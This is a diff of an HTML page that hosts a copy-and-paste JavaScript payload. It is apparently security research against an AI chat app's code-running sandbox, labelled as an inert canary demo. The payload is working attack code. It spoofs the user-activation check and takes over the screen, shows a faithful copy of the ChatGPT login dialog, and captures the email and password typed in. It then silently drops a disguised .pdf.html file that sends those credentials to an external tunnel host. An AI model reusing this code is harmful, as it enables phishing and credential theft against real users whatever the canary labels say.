@@ -14,89 +14,203 @@ button{width:100%;height:56px;font-size:17px;font-weight:600;background:#238636;
 </head>
 <body>
 <h1>Pluto Security — playground clean copy</h1>
-<div id="hdr">PAYLOAD: T70e — mobile download primitive probe (inert canary)
-Runtime: native mobile app — Paste&amp;Run in the phone app.
-Epoch: 1792653423
+<div id="hdr">PAYLOAD: T71 — COMBINED END-TO-END DEMO (inert canary)
+Runtime: desktop web (viewer or owner session — Paste&amp;Run).
+Epoch: 1792655334   Receiver: uniform-var-laura-cpu.trycloudflare.com
 
-After Run: watch for ~5s (auto attempt fires), then tap the green
-button (manual attempt). Report any visible save/download UI — Files
-app, download bar, share sheet, toast — or nothing at all.</div>
-<button onclick="navigator.clipboard.writeText(document.getElementById('code').textContent).then(function(){this.textContent='COPIED — paste it in the phone app'});this.textContent='COPIED — paste it in the phone app'">COPY PAYLOAD</button>
-<pre id="code">// T70e — mobile download primitive probe (Pluto Security research canary)
-// Question: does the T11-class silent download (spoofed activation -&gt;
-// anchor download) exist in the native mobile app runtime, and what
-// does the phone visibly do (save UI? Files app? nothing)?
-// Inert: a tiny clearly-labeled text file, no data, nothing real.
+STEPS: Run → full-screen login replica appears → type clearly-labeled
+CANARY credentials (e.g. canary-user@pluto.test / Canary-Pass-1792655334)
+→ Continue → a red panel confirms capture + a file named
+ChatGPT_Account_Details_2026.pdf.html is written SILENTLY to ~/Downloads
+→ double-click that file ONCE → it opens with no warning and sends the
+canary values to our receiver. RECORD the whole thing for the video.</div>
+<button onclick="navigator.clipboard.writeText(document.getElementById('code').textContent).then(function(){this.textContent='COPIED — paste it in the playground'});this.textContent='COPIED — paste it in the playground'">COPY PAYLOAD</button>
+<pre id="code">/* T71 - COMBINED END-TO-END DEMO, INERT CANARY (Pluto Security).
+   The full report narrative in ONE payload:
+   1. fullscreen takeover (requestDisplayMode, T41B-proven)
+   2. ChatGPT login-replica modal (T41B-proven UI)
+   3. canary credentials typed by the RESEARCHER are captured in-frame
+   4. captured data is BAKED INTO a file written silently to
+      ~/Downloads at write time (T66-proven mechanism), under a
+      curiosity-triggering attacker-chosen name
+   5. researcher double-clicks the file ONCE -&gt; it opens as file://
+      with NO warning -&gt; beacons the captured credentials to OUR OWN
+      receiver -&gt; receiver log shows the exact typed strings.
+   Nothing real: researcher-typed clearly-labeled canary creds only,
+   our own receiver only. */
 (function () {
-  var EPOCH = 1792653423;
-  var FILE = &quot;Invoice-T70e-&quot; + EPOCH + &quot;.txt&quot;;
-  var TEXT = &quot;T70e mobile download canary &quot; + EPOCH + &quot; — Pluto Security (inert)\n&quot;;
+  var EPOCH = 1792655334;
+  var R = &quot;https://uniform-var-laura-cpu.trycloudflare.com/leak?d=&quot;;
+  var FNAME = &quot;ChatGPT_Account_Details_2026.pdf.html&quot;;
+  function log(m) { try { console.log(&quot;[T71] &quot; + m + &quot; @&quot; + Date.now()); } catch (e) {} }
+  log(&quot;START combined demo, epoch &quot; + EPOCH + &quot;, origin &quot; + location.origin);
 
-  // T11-proven activation spoof (satisfies the runner-side call-time gate)
+  var API = window.oai || window.openai || window.webplus;
+
+  /* spoof activation (T11-proven) - keeps the runner&#x27;s call-time gate satisfied */
   try {
     Object.defineProperty(navigator, &quot;userActivation&quot;, {
       get: function () { return { isActive: true, hasBeenActive: true }; },
       configurable: true
     });
-  } catch (e) {}
+    log(&quot;activation spoofed&quot;);
+  } catch (e) { log(&quot;spoof ERR &quot; + e.message); }
+
+  /* fullscreen takeover (T41B-proven) */
+  try {
+    if (API &amp;&amp; API.requestDisplayMode) {
+      API.requestDisplayMode({ mode: &quot;fullscreen&quot; }).then(function (r) {
+        log(&quot;requestDisplayMode: &quot; + JSON.stringify(r));
+      }, function (e) { log(&quot;requestDisplayMode rejected: &quot; + (e &amp;&amp; e.message || e)); });
+    } else log(&quot;requestDisplayMode absent (continuing overlay-only)&quot;);
+  } catch (e) { log(&quot;displayMode ERR &quot; + e.message); }
 
   var d = document;
   var css = d.createElement(&quot;style&quot;);
   css.textContent = [
-    &quot;#t70e-ov{position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.6);display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,&#x27;Segoe UI&#x27;,Helvetica,Arial,sans-serif;padding:16px;box-sizing:border-box}&quot;,
-    &quot;#t70e-card{width:100%;max-width:420px;box-sizing:border-box;background:#212121;border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:22px;color:#fff;text-align:left}&quot;,
-    &quot;#t70e-card h1{font-size:17px;font-weight:600;margin:0 0 6px}&quot;,
-    &quot;#t70e-card p{font-size:13px;color:#9b9b9b;line-height:1.5;margin:0 0 14px}&quot;,
-    &quot;#t70e-st{font-family:Menlo,Consolas,monospace;font-size:11px;line-height:1.7;border:1px solid rgba(255,255,255,.15);border-radius:10px;padding:12px;background:rgba(0,0,0,.35);color:#e8e8e8;word-break:break-all}&quot;,
-    &quot;#t70e-st b{color:#7ee787}&quot;,
-    &quot;#t70e-card button.tap{width:100%;height:52px;margin:6px 0 0;background:#238636;border:none;border-radius:12px;color:#fff;font-size:15px;font-weight:600}&quot;,
-    &quot;#t70e-x{margin-top:14px;width:100%;height:42px;background:transparent;border:1px solid rgba(255,255,255,.2);border-radius:999px;color:#fff;font-size:14px}&quot;
+    &quot;#t71-ov{position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;font-family:&#x27;Sohne&#x27;,-apple-system,BlinkMacSystemFont,&#x27;Segoe UI&#x27;,Helvetica,Arial,sans-serif}&quot;,
+    &quot;#t71-modal{position:relative;width:400px;max-width:calc(100vw - 48px);box-sizing:border-box;background:#212121;border:1px solid rgba(255,255,255,.07);border-radius:24px;padding:28px 28px 32px;box-shadow:0 24px 64px rgba(0,0,0,.5);text-align:center;color:#fff}&quot;,
+    &quot;#t71-x{position:absolute;top:14px;right:16px;width:28px;height:28px;border:none;background:transparent;color:#fff;font-size:18px;line-height:28px;cursor:pointer;border-radius:999px}&quot;,
+    &quot;#t71-x:hover{background:rgba(255,255,255,.1)}&quot;,
+    &quot;#t71-modal h1{font-size:20px;font-weight:600;line-height:1.3;margin:0 0 8px;color:#fff}&quot;,
+    &quot;#t71-modal p.sub{font-size:14px;color:#9b9b9b;line-height:1.5;margin:0 0 22px}&quot;,
+    &quot;#t71-modal button.t71-sso{width:100%;height:48px;background:transparent;border:1px solid rgba(255,255,255,.18);border-radius:999px;font-size:15px;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:12px}&quot;,
+    &quot;#t71-or{display:flex;align-items:center;gap:12px;margin:16px 4px 18px;color:#8f8f8f;font-size:13px}&quot;,
+    &quot;#t71-or:before,#t71-or:after{content:&#x27;&#x27;;flex:1;height:1px;background:rgba(255,255,255,.15)}&quot;,
+    &quot;#t71-modal input{width:100%;box-sizing:border-box;height:48px;padding:0 16px;font-size:15px;border:1px solid rgba(255,255,255,.12);border-radius:12px;background:rgba(0,0,0,.35);color:#fff;outline:none;margin-bottom:16px}&quot;,
+    &quot;#t71-modal input::placeholder{color:#8f8f8f}&quot;,
+    &quot;#t71-modal input:focus{border-color:rgba(255,255,255,.4)}&quot;,
+    &quot;#t71-modal button.t71-cta{width:100%;height:48px;background:#fff;color:#0d0d0d;border:none;border-radius:999px;font-size:15px;font-weight:600;cursor:pointer;margin:0}&quot;,
+    &quot;#t71-ch{border:2px solid #ff5252;border-radius:12px;padding:14px;text-align:left;font-family:Menlo,Consolas,monospace;font-size:12px;background:rgba(0,0,0,.35);color:#ff8a8a;line-height:1.7}&quot;,
+    &quot;#t71-ch b{font-size:13px;color:#ff5252}&quot;,
+    &quot;#t71-corner{position:fixed;right:8px;bottom:8px;z-index:2147483647;font-family:Menlo,monospace;font-size:10px;color:#ff5252;background:rgba(0,0,0,.75);padding:2px 6px;border:1px solid #ff5252;border-radius:4px}&quot;
   ].join(&quot;&quot;);
   var ov = d.createElement(&quot;div&quot;);
-  ov.id = &quot;t70e-ov&quot;;
+  ov.id = &quot;t71-ov&quot;;
   ov.appendChild(css);
-  var card = d.createElement(&quot;div&quot;);
-  card.id = &quot;t70e-card&quot;;
-  card.innerHTML =
-    &quot;&lt;h1&gt;T70e — mobile download probe&lt;/h1&gt;&quot; +
-    &#x27;&lt;p&gt;Research canary (Pluto Security, inert). Watch: after a moment (and after the tap), does the phone show ANY save/download UI — Files app, a download bar, a share sheet — or nothing?&lt;/p&gt;&#x27; +
-    &#x27;&lt;div id=&quot;t70e-st&quot;&gt;&lt;/div&gt;&#x27; +
-    &#x27;&lt;button class=&quot;tap&quot; id=&quot;t70e-b1&quot; type=&quot;button&quot;&gt;TAP: manual download trigger&lt;/button&gt;&#x27;;
-  ov.appendChild(card);
-  var x = d.createElement(&quot;button&quot;);
-  x.id = &quot;t70e-x&quot;; x.type = &quot;button&quot;; x.textContent = &quot;Close&quot;;
-  x.onclick = function () { ov.remove(); };
-  card.appendChild(x);
+  var modal = d.createElement(&quot;div&quot;);
+  modal.id = &quot;t71-modal&quot;;
+  ov.appendChild(modal);
   d.body.appendChild(ov);
 
-  function st(html) { var e = d.getElementById(&quot;t70e-st&quot;); if (e) e.innerHTML += html; }
-  st(&quot;token: T70e-&quot; + EPOCH + &quot;&lt;br&gt;&quot;);
-  st(&quot;file: &quot; + FILE + &quot;&lt;br&gt;&quot;);
-  st(&quot;spoof: userActivation set&lt;br&gt;&quot;);
+  var corner = d.createElement(&quot;div&quot;);
+  corner.id = &quot;t71-corner&quot;;
+  corner.textContent = &quot;RESEARCH CANARY - Pluto Security (inert, own receiver)&quot;;
+  d.body.appendChild(corner);
 
-  function trigger(tag) {
+  function el(html) { var t = d.createElement(&quot;div&quot;); t.innerHTML = html; return t.firstElementChild; }
+  var gSvg = &#x27;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 18 18&quot;&gt;&lt;path fill=&quot;#4285F4&quot; d=&quot;M17.64 9.2c0-.64-.06-1.25-.16-1.84H9v3.48h4.84a4.14 4.14 0 0 1-1.8 2.72v2.26h2.92c1.7-1.57 2.68-3.88 2.68-6.62z&quot;/&gt;&lt;path fill=&quot;#34A853&quot; d=&quot;M9 18c2.43 0 4.47-.8 5.96-2.18l-2.92-2.26c-.8.54-1.84.86-3.04.86-2.34 0-4.32-1.58-5.03-3.7H.96v2.32A9 9 0 0 0 9 18z&quot;/&gt;&lt;path fill=&quot;#FBBC05&quot; d=&quot;M3.97 10.72a5.4 5.4 0 0 1 0-3.44V4.96H.96a9 9 0 0 0 0 8.08l3.01-2.32z&quot;/&gt;&lt;path fill=&quot;#EA4335&quot; d=&quot;M9 3.58c1.32 0 2.5.45 3.43 1.35l2.58-2.58C13.46.9 11.43 0 9 0A9 9 0 0 0 .96 4.96l3.01 2.32C4.68 5.16 6.66 3.58 9 3.58z&quot;/&gt;&lt;/svg&gt;&#x27;;
+  var aSvg = &#x27;&lt;span style=&quot;font-size:19px;line-height:1;color:#fff&quot;&gt;\uF8FF&lt;/span&gt;&#x27;;
+  var pSvg = &#x27;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot;&gt;&lt;path d=&quot;M6.6 10.5c1-1.9 1.4-3.9 1.3-6l4.7 4.7c1.9-1 3.6-1.2 4.6-.6 1.2.7 1.2 2.5.1 4.6l2.6 2.6-2 2-2.4-2.4c-2.5 1.4-4.7 1.6-6 .4-1-.9-1.2-2.5-.4-4.5L5.7 12.9c-.9-.9-.8-1.8.9-2.4z&quot; fill=&quot;#fff&quot;/&gt;&lt;/svg&gt;&#x27;;
+
+  function xBtn() {
+    var x = d.createElement(&quot;button&quot;);
+    x.id = &quot;t71-x&quot;; x.type = &quot;button&quot;; x.textContent = &quot;\u2715&quot;;
+    x.onclick = function () { ov.remove(); corner.remove(); };
+    return x;
+  }
+
+  function renderEmailStep() {
+    modal.innerHTML = &quot;&quot;;
+    modal.appendChild(xBtn());
+    modal.appendChild(el(&quot;&lt;h1&gt;Log in or sign up&lt;/h1&gt;&quot;));
+    modal.appendChild(el(&#x27;&lt;p class=&quot;sub&quot;&gt;You\u2019ll get smarter responses and can upload files, images, and more.&lt;/p&gt;&#x27;));
+    modal.appendChild(el(&#x27;&lt;button class=&quot;t71-sso&quot; type=&quot;button&quot;&gt;&#x27; + gSvg + &quot; Continue with Google&lt;/button&gt;&quot;));
+    modal.appendChild(el(&#x27;&lt;button class=&quot;t71-sso&quot; type=&quot;button&quot;&gt;&#x27; + aSvg + &quot; Continue with Apple&lt;/button&gt;&quot;));
+    modal.appendChild(el(&#x27;&lt;button class=&quot;t71-sso&quot; type=&quot;button&quot;&gt;&#x27; + pSvg + &quot; Continue with phone&lt;/button&gt;&quot;));
+    modal.appendChild(el(&#x27;&lt;div id=&quot;t71-or&quot;&gt;OR&lt;/div&gt;&#x27;));
+    var em = d.createElement(&quot;input&quot;);
+    em.type = &quot;email&quot;; em.placeholder = &quot;Email address&quot;; em.autocomplete = &quot;username&quot;;
+    modal.appendChild(em);
+    var go = d.createElement(&quot;button&quot;);
+    go.className = &quot;t71-cta&quot;; go.type = &quot;button&quot;; go.textContent = &quot;Continue&quot;;
+    go.onclick = function () { if (em.value.trim()) renderPwStep(em.value.trim()); };
+    modal.appendChild(go);
+    em.focus();
+  }
+
+  function renderPwStep(email) {
+    modal.innerHTML = &quot;&quot;;
+    modal.appendChild(xBtn());
+    modal.appendChild(el(&quot;&lt;h1&gt;Enter your password&lt;/h1&gt;&quot;));
+    modal.appendChild(el(&#x27;&lt;p class=&quot;sub&quot;&gt;Welcome back! Enter your password to continue to ChatGPT.&lt;/p&gt;&#x27;));
+    var pw = d.createElement(&quot;input&quot;);
+    pw.type = &quot;password&quot;; pw.placeholder = &quot;Password&quot;; pw.autocomplete = &quot;current-password&quot;;
+    modal.appendChild(pw);
+    var go = d.createElement(&quot;button&quot;);
+    go.className = &quot;t71-cta&quot;; go.type = &quot;button&quot;; go.textContent = &quot;Continue&quot;;
+    go.onclick = function () { if (pw.value) finish(email, pw.value); };
+    modal.appendChild(go);
+    pw.focus();
+  }
+
+  function esc(s) { return String(s).replace(/&amp;/g, &quot;&amp;amp;&quot;).replace(/&lt;/g, &quot;&amp;lt;&quot;).replace(/&gt;/g, &quot;&amp;gt;&quot;).replace(/&quot;/g, &quot;&amp;quot;&quot;); }
+
+  function finish(email, pass) {
+    var TOKEN = &quot;T71-&quot; + EPOCH;
+    log(&quot;CAPTURED canary credentials (researcher-typed): email=&quot; + email + &quot; (len &quot; + email.length + &quot;), pass len &quot; + pass.length);
+
+    /* --- the dropped file: fake account-details page with the captured
+           data baked in AT WRITE TIME + silent beacons to OUR receiver --- */
+    var credParam = encodeURIComponent(&quot;T71|&quot; + EPOCH + &quot;|email=&quot; + email + &quot;|password=&quot; + pass);
+    var fileHtml = [
+      &quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\&quot;utf-8\&quot;&gt;&lt;title&gt;ChatGPT_Account_Details_2026&lt;/title&gt;&lt;/head&gt;&quot;,
+      &quot;&lt;body style=\&quot;font:14px -apple-system,Helvetica,Arial,sans-serif;background:#fff;color:#111;padding:24px;max-width:520px\&quot;&gt;&quot;,
+      &quot;&lt;h2 style=\&quot;font-weight:600\&quot;&gt;ChatGPT account details&lt;/h2&gt;&quot;,
+      &quot;&lt;table style=\&quot;border-collapse:collapse;font-size:14px\&quot;&gt;&quot;,
+      &quot;&lt;tr&gt;&lt;td style=\&quot;padding:6px 18px 6px 0;color:#666\&quot;&gt;Email&lt;/td&gt;&lt;td&gt;&lt;b&gt;&quot; + esc(email) + &quot;&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&quot;,
+      &quot;&lt;tr&gt;&lt;td style=\&quot;padding:6px 18px 6px 0;color:#666\&quot;&gt;Password&lt;/td&gt;&lt;td&gt;&lt;b&gt;&quot; + esc(pass) + &quot;&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&quot;,
+      &quot;&lt;/table&gt;&quot;,
+      &quot;&lt;p style=\&quot;color:#c00;font:11px Menlo,monospace\&quot;&gt;PLUTO SECURITY RESEARCH CANARY - INERT - these are researcher-typed canary values, sent only to the researcher&#x27;s own receiver.&lt;/p&gt;&quot;,
+      &quot;&lt;pre id=\&quot;out\&quot; style=\&quot;font:11px Menlo,monospace\&quot;&gt;file:// page loaded... beacon pending&lt;/pre&gt;&quot;,
+      &quot;&lt;script&gt;&quot;,
+      &quot;var R = \&quot;&quot; + R + &quot;\&quot;;&quot;,
+      &quot;function log(m){ var o = document.getElementById(\&quot;out\&quot;); o.textContent += \&quot;\\n\&quot; + m; }&quot;,
+      &quot;log(\&quot;opened as file:// page at \&quot; + Date.now() + \&quot; (no warning shown)\&quot;);&quot;,
+      &quot;try {&quot;,
+      &quot;  fetch(R + \&quot;&quot; + credParam + &quot;-fetch\&quot;)&quot;,
+      &quot;    .then(function(r){ log(\&quot;FETCH BEACON SENT - captured credentials delivered, status=\&quot; + r.status); })&quot;,
+      &quot;    .catch(function(e){ log(\&quot;fetch blocked: \&quot; + e.message); });&quot;,
+      &quot;} catch(e) { log(\&quot;fetch threw: \&quot; + e.message); }&quot;,
+      &quot;var i = new Image();&quot;,
+      &quot;i.onload = function(){ log(\&quot;IMG BEACON SENT - captured credentials delivered\&quot;); };&quot;,
+      &quot;i.onerror = function(){ log(\&quot;img beacon failed\&quot;); };&quot;,
+      &quot;i.src = R + \&quot;&quot; + credParam + &quot;-img\&quot;;&quot;,
+      &quot;&lt;\/script&gt;&lt;/body&gt;&lt;/html&gt;&quot;
+    ].join(&quot;&quot;);
+
+    /* --- silent write via the host&#x27;s download bootstrap (T66-proven) --- */
     try {
-      var blob = new Blob([TEXT], { type: &quot;text/plain&quot; });
+      var blob = new Blob([fileHtml], { type: &quot;text/html&quot; });
       var url = URL.createObjectURL(blob);
       var a = d.createElement(&quot;a&quot;);
       a.href = url;
-      a.download = FILE;
+      a.download = FNAME;
       a.style.display = &quot;none&quot;;
       d.body.appendChild(a);
       a.click();
-      st(tag + &quot;: anchor clicked (&quot; + FILE + &quot;)&lt;br&gt;&quot;);
-      setTimeout(function () { URL.revokeObjectURL(url); a.remove(); }, 8000);
-    } catch (e) {
-      st(tag + &quot;: THREW &quot; + (e &amp;&amp; e.message ? e.message : String(e)) + &quot;&lt;br&gt;&quot;);
-    }
+      setTimeout(function () { URL.revokeObjectURL(url); a.remove(); }, 4000);
+      log(&quot;WRITE FIRED: &quot; + FNAME + &quot; with captured data baked in&quot;);
+    } catch (e) { log(&quot;write ERR &quot; + e.message); }
+
+    /* --- in-frame confirmation (clearly labeled canary) --- */
+    modal.innerHTML = &quot;&quot;;
+    modal.appendChild(xBtn());
+    modal.appendChild(el(&quot;&lt;h1&gt;T71 \u2014 captured&lt;/h1&gt;&quot;));
+    var cap = d.createElement(&quot;div&quot;);
+    cap.id = &quot;t71-ch&quot;;
+    cap.innerHTML =
+      &quot;&lt;b&gt;RESEARCH CANARY \u2014 NOTHING REAL (values below were typed by the researcher)&lt;/b&gt;&lt;br&gt;&quot; +
+      &quot;email: &quot; + esc(JSON.stringify(email)) + &quot;&lt;br&gt;&quot; +
+      &quot;password: &quot; + esc(JSON.stringify(pass)) + &quot;&lt;br&gt;&lt;br&gt;&quot; +
+      &quot;&lt;b&gt;A file was just written silently to ~/Downloads:&lt;/b&gt;&lt;br&gt;&quot; +
+      FNAME + &quot;&lt;br&gt;&quot; +
+      &quot;It contains these values, baked in at write time.&lt;br&gt;&quot; +
+      &quot;&lt;b&gt;Double-click it once \u2014 it will open with no warning and send them to our receiver.&lt;/b&gt;&quot;;
+    modal.appendChild(cap);
   }
 
-  // auto attempt (zero click — T11 chain shape)
-  setTimeout(function () { trigger(&quot;auto&quot;); }, 1500);
-
-  // manual attempt (real gesture)
-  var b = d.getElementById(&quot;t70e-b1&quot;);
-  if (b) b.addEventListener(&quot;click&quot;, function () { trigger(&quot;tap&quot;); });
+  renderEmailStep();
 })();
 </pre>
 </body>
